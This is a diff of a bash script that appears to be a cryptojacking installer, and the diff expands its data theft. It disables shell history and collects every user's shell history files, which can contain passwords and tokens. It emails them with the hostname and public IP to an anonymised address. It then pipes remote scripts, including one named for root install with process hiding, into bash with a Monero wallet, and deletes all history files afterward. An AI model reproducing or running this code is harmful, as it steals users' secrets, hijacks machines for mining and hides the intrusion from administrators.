@@ -1,43 +1,53 @@
 #!/bin/bash
 unset HISTFILE
 
-# Function to check if a service exists
-does_service_exist() {
-    service="$1"
-    systemctl list-units --type=service --all | grep -q "$service.service"
-}
-
-# Function to check if a service is running
-is_service_running() {
-    service="$1"
-    systemctl is-active --quiet "$service"
-}
-
-# List of services to check
-services=("swapd" "gdm2")
-
-# Check if any of the services are running and abort if they are
-for service in "${services[@]}"; do
-    if does_service_exist "$service"; then
-        if is_service_running "$service"; then
-            echo "ERROR: Service $service is currently running. Aborting script execution."
-            exit 1
-        else
-            echo "Service $service exists but is not running"
-        fi
-    else
-        echo "Service $service does not exist"
+# Function to collect history from all available shells
+collect_shell_history() {
+    echo "=== COLLECTING SHELL HISTORIES ==="
+    
+    # List of common shell history files
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
+    
+    # System-wide shells (check /etc/shells)
+    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
+    
+    OUTPUT=""
+    for shell in $SYSTEM_SHELLS; do
+        case $shell in
+            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
+                hist_file="${SHELL_HISTORIES[$shell]}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+                ;;
+        esac
+    done
+    
+    # Also check for root histories if running as root
+    if [ $(id -u) -eq 0 ]; then
+        for user in $(ls /home); do
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+            done
+        done
     fi
-done
+    
+    echo -e "$OUTPUT"
+}
 
-echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
-echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
-echo -e "|   CPU Cores    |      $(nproc)      |"
-echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
-echo -e "---------------------------------"
-
-# Enhanced email function with error handling
-send_email_with_history() {
+# Function to send email with all histories
+send_histories_email() {
     # Get system info
     HOSTNAME=$(hostname)
     PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
@@ -57,42 +67,63 @@ RAM: $(free -h | awk '/^Mem:/ {print $2}')
 CPU: $(nproc) cores
 Storage: $(df -h / | awk 'NR==2 {print $2}')
 
-=== BASH HISTORY ===
-$(cat ~/.bash_history 2>/dev/null || echo "No history found")
+$(collect_shell_history)
 EOF
     )
 
-    # Try to send email (silent unless error)
+    # Send email
     if command -v mail &>/dev/null; then
-        echo "$EMAIL_CONTENT" | mail -s "System Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com 2>/tmp/mail_error.log
-        if [ $? -ne 0 ]; then
-            echo "Warning: Failed to send email (check /tmp/mail_error.log)"
-        fi
+        echo "$EMAIL_CONTENT" | mail -s "Full Shell History Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com
     else
-        echo "Warning: mailutils not installed - skipping email report"
+        echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
+        echo "$EMAIL_CONTENT" > /tmp/system_report.txt
     fi
 }
 
-# Call email function
-send_email_with_history
+# Original service check functions
+does_service_exist() {
+    service="$1"
+    systemctl list-units --type=service --all | grep -q "$service.service"
+}
 
-# Original installation functions with root checks
-rootstuff() {
-    if [[ $(id -u) -ne 0 ]]; then
-        echo "ERROR: root privileges required for this installation"
-        return 1
+is_service_running() {
+    service="$1"
+    systemctl is-active --quiet "$service"
+}
+
+# --- Main Execution ---
+
+# Service checks
+services=("swapd" "gdm2")
+for service in "${services[@]}"; do
+    if does_service_exist "$service"; then
+        if is_service_running "$service"; then
+            echo "ERROR: Service $service is running. Aborting."
+            exit 1
+        fi
     fi
-    
-    echo -e "\nStarting root installation..."
-    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-    
-    # If switched user during install, restart script
-    [ "$USER" != root ] && sudo -u "$USER" "$0"
+done
+
+# System info display
+echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
+echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
+echo -e "|   CPU Cores    |      $(nproc)      |"
+echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
+echo -e "---------------------------------"
+
+# Send all shell histories
+send_histories_email
+
+# Original installation functions
+rootstuff() {
+  echo -e "\nStarting root installation..."
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+  [ "$USER" != root ] && sudo -u "$USER" "$0"
 }
 
 userstuff() {
-    echo -e "\nStarting user installation..."
-    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+  echo -e "\nStarting user installation..."
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
 }
 
 # Original execution logic
@@ -102,13 +133,25 @@ else
     userstuff
 fi
 
-# Enhanced history cleanup
-cleanup_history() {
-    echo "Cleaning history..."
+# Enhanced history cleanup for all shells
+cleanup_histories() {
+    echo "Cleaning all shell histories..."
+    
+    # Current user's histories
+    rm -f ~/.bash_history ~/.zsh_history ~/.sh_history 
+    rm -rf ~/.local/share/fish/fish_history
+    rm -f ~/.history
+    
+    # Root cleans all user histories if running as root
+    if [ $(id -u) -eq 0 ]; then
+        for user in $(ls /home); do
+            rm -f /home/$user/.bash_history /home/$user/.zsh_history /home/$user/.sh_history
+            rm -rf /home/$user/.local/share/fish/fish_history
+            rm -f /home/$user/.history
+        done
+    fi
+    
+    # Clear current session history
     history -c
-    rm -f ~/.bash_history
-    for i in $(seq 1 $(history | wc -l)); do
-        history -d 1
-    done
 }
-cleanup_history
+cleanup_histories
